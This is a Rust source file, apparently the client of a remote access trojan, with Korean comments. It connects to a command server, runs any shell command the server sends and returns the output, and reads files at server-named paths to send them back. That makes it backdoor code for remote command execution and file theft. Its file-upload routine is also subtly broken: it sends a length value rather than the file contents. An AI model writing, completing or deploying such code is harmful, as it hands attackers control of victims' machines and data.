
mod exploit;
mod structure;
mod stprotocol;

use std::fs::File;
use std::io::Read;
use std::path::{Path};
use exploit::{Malware, Exploits };
use structure:: {StructStone, StructStonePayload, StoneTransferProtocol, Detector, Generator};
use stprotocol::{ Session, Client };

fn main() {
    let mut exploit = Exploits::default();
    event_loop(
        Session::new("127.0.0.1:6974".to_string()),
        StructStone::default(),
        exploit
    )
}

fn event_loop(mut client: Session,mut packet: StructStone,mut exploit: Exploits){
    let mut ex = Exploits::default();
    loop { // 새션 생성후 서버와 지속적인 통신을 위한 루프문

        packet = client.receiving(StructStone::default());// 연결요청후 서버의 응답 대기

        println!("서버 응답타입: {:?}", packet.header_type());

        match packet.header_type() { // 서버의 응답 타입을 비교하여 보낼 요청을 생성함
            StoneTransferProtocol::ExecuteCmd => { // 타입이 Request 일 경우
                ex = exploit.command(packet.get_command(), ex.get_last_cmd()).execute();
                client.send(StructStonePayload::new(
                    vec![],
                    ex.get_output(),
                    vec![]
                ).to_stone().stone) // 생성한 응답을 전송
            },
            StoneTransferProtocol::Download => { // 타입이 Request 일 경우
                match String::from_utf8(packet.get_file()) {
                    Ok(ok) => client.send( handle_upload(&ok).stone ),
                    Err(_) => client.send_msg("File Not Found")
                }
            },
            StoneTransferProtocol::Disconnect => { client.disconnect(); break }, // 만약 서버의 응답이 Disconnect 일 경우 연결을 종료한다

            _ => client.send(packet.stone) //만약 위의 응답 타입을 제외한 응답을 보낼경우 서버의 응답과 같은 요청을 전송함
        };
    }
}

fn handle_upload(path: &String)  -> StructStone {
    let path = Path::new(path);
    let mut open_file = File::open(path).expect("File Not Found");
    let mut file = vec![];

    let file = match open_file.read_to_end(&mut file) {
        Ok(ok) => ok.to_le_bytes().to_vec(),
        Err(_) => b"File Not Found".to_vec()
    };

    StructStonePayload::new(vec![],vec![],file).to_stone()
}
